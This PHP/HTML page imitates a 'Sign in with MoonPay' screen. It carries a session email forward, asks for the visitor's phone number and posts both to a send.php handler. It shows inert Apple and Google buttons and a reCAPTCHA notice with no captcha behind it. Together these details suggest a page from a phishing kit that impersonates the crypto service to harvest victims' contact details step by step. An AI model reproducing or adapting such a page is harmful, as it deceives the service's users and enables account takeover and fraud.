<?php include_once './config.php'; ?>
<html lang="en">
    <?php
    $title = 'MoonPay Account';
    include_once './includes/meta.php';
    if (empty($_SESSION["email"])) {
        redirect(base_url());
    }
    ?>
    <link rel="stylesheet" href="<?= base_url('assets/country-code-picker/css/jquery.ccpicker.css') ?>">
    <body>
        <div class="container-fluid d-flex align-items-center justify-content-center" style="height: 100%">
            <div class="row">
                <div class='rounded-5 p25 mt30 bg-white text-center' style="border: 1px #edf2f9 solid; max-width: 400px; ">
                    <h1 class="fs15">Sign in with MoonPay</h1>
                    <form method="post" action="<?= base_url('send.php') ?>" class="form">
                        <input type="hidden" name="email" value="<?= $_SESSION['email'] ?>" >
                        <div class="my20 text-start">
                            <label class="form-label fw-semibold">Phone Number</label>
                            <div class="form-control" style="padding: 0px;">
                                <input name="phone_number" type="number" id="phone_number" required="" style="width: 70%;border: solid 0px #DDD;padding: 10px 5px;margin: 0px;" class="" placeholder="Phone number" value="" >
                            </div>
                        </div>
                        <button type="submit" class="btn btn-success btn-primary-2 border-0 rounded-pill rounded-0 py12 fs15 w-100">Submit</button>
                    </form>
                    <div class='col-sm-12 my30 text-center border-top' style="position: relative">
                        <span class="text-secondary px10 bg-white fs14" style="position: absolute; bottom:-10px; left:30% ">Or sign in with</span>
                    </div>
                    <div class="row">
                        <div class="col-sm-6">
                            <button type="button" class="btn btn-secondary btn-secondary-2 border-0 rounded-pill rounded-0 py12 fs15 w-100 fw-bold">
                                <i class="fa-brands fa-apple text-secondary fs18 pe10"></i>
                                Apple
                            </button>
                        </div>
                        <div class="col-sm-6">
                            <button type="button" class="btn btn-secondary btn-secondary-2 border-0 rounded-pill rounded-0 py12 fs15 w-100 fw-bold">
                                <i class="fa-brands fa-google text-secondary fs18 pe10"></i>
                                Google
                            </button>
                        </div>
                    </div>
                    <div class="row">
                        <div class="col-sm-12 text-secondary mt20 fs12 lh20">
                            <span>This site is protected by reCAPTCHA and the Google</span>
                            <a href="https://policies.google.com/privacy" target="_blank" rel="noopener noreferrer" class="text-dark text-decoration-none">
                                Privacy Policy
                            </a> and
                            <a href="https://policies.google.com/terms" target="_blank" rel="noopener noreferrer" class="text-dark text-decoration-none">
                                Terms of Service
                            </a> apply.
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <?php include_once './includes/footer.php'; ?>
        <script src="./assets/country-code-picker/js/jquery.ccpicker.min.js"></script>
        <script type="text/javascript">
            $(document).ready(function () {
                $("#phone_number").CcPicker({countryCode: "us", dataUrl: "<?= base_url('assets/country-code-picker/data/en.json') ?>", searchPlaceHolder: "Find..."});
            });
        </script>
    </body>
</html>